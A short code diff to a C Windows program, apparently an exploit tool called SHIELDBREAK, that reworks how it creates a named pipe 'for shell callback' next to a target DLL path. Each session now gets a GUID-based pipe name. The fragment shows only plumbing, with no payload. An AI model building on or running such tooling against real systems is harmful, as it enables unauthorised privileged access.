@@ -295,8 +295,16 @@ int main() {
         printf("[+] Target DLL location available: %ws\n\n", targetDll);
     }
 
-    // Create named pipe for shell callback
-    g_hPipe = CreateNamedPipeW(L"\\\\.\\pipe\\SHIELDBREAK_WIN10",
+    // Generate unique GUID for this run first (moved up)
+    wchar_t guid[64];
+    GenerateGUID(guid);
+    printf("[+] Session GUID: %ws\n", guid);
+
+    // Create named pipe for shell callback with unique name per session
+    wchar_t pipeName[128];
+    swprintf(pipeName, 128, L"\\\\.\\pipe\\SHIELDBREAK_%ws", guid);
+
+    g_hPipe = CreateNamedPipeW(pipeName,
         PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
         PIPE_TYPE_MESSAGE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);
 
@@ -305,12 +313,9 @@ int main() {
         printf("[-] Another instance may be running\n");
         return 1;
     }
-    printf("[+] Named pipe created: \\\\.\\pipe\\SHIELDBREAK_WIN10\n");
+    wprintf(L"[+] Named pipe created: %ws\n", pipeName);
 
-    // Generate unique GUID for this run
-    wchar_t guid[64];
-    GenerateGUID(guid);
-    printf("[+] Session GUID: %ws\n", guid);
+    // GUID already generated above for pipe name
 
     // Create work directory
     wchar_t temp[MAX_PATH];
